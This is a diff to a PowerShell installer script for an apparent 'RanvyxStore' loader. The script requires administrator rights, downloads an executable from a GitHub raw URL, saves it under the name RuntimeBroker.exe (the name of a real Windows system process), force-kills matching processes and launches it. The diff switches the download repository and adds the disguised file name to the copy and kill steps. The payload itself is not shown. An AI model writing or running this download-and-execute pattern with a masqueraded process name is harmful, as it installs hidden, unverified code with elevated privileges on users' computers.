@@ -1,7 +1,7 @@
 param(
-    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/RuntimeBroker.exe',
+    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe',
     [string]$p = '',
-    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/RANVYXEXE.ps1'
+    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RANVYXEXE.ps1'
 )
 
 $ProgressPreference = 'Continue'
@@ -12,31 +12,34 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-$b = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main'
+$b = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main'
+$exeName = 'RuntimeBroker.exe'
 $t = if ($p -and (Test-Path $p)) { $p }
      elseif ($p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; $p }
      else { Join-Path $env:LOCALAPPDATA 'RanvyxStore' }
 
 New-Item -ItemType Directory -Force -Path $t, (Join-Path $t 'assets'), (Join-Path $t 'assets\fonts') | Out-Null
 
+$target = Join-Path $t $exeName
+Get-Process | Where-Object { $_.Path -eq $target } -EA 0 | Stop-Process -Force -EA 0
 Get-Process FourtyStoreLoader -EA 0 | Stop-Process -Force -EA 0
 
 $f = Join-Path $env:TEMP 'rvx.tmp'
 Invoke-WebRequest $u -OutFile $f -UseBasicParsing
-Copy-Item $f (Join-Path $t 'FourtyStoreLoader.exe') -Force
+Copy-Item $f (Join-Path $t $exeName) -Force
 Remove-Item $f -Force -EA 0
 
 @(
-    @('assets/logo.png', 'logo.png'),
-    @('assets/brand_banner.png', 'brand_banner.png'),
-    @('assets/fonts/Kanit-Regular.ttf', 'fonts/Kanit-Regular.ttf'),
-    @('assets/fonts/Kanit-Medium.ttf', 'fonts/Kanit-Medium.ttf'),
-    @('assets/fonts/Kanit-SemiBold.ttf', 'fonts/Kanit-SemiBold.ttf'),
-    @('assets/fonts/Kanit-Bold.ttf', 'fonts/Kanit-Bold.ttf')
+    'assets/logo.png',
+    'assets/brand_banner.png',
+    'assets/fonts/Kanit-Regular.ttf',
+    'assets/fonts/Kanit-Medium.ttf',
+    'assets/fonts/Kanit-SemiBold.ttf',
+    'assets/fonts/Kanit-Bold.ttf'
 ) | ForEach-Object {
-    $dst = Join-Path $t $_[1]
-    try { Invoke-WebRequest ($b + '/' + $_[0]) -OutFile $dst -UseBasicParsing -EA Stop } catch {}
+    $dst = Join-Path $t ($_.Replace('/', '\'))
+    try { Invoke-WebRequest ($b + '/' + $_) -OutFile $dst -UseBasicParsing -EA Stop } catch {}
 }
 
-Start-Process (Join-Path $t 'RuntimeBroker.exe')
+Start-Process (Join-Path $t $exeName)
 Write-Host 'OK'
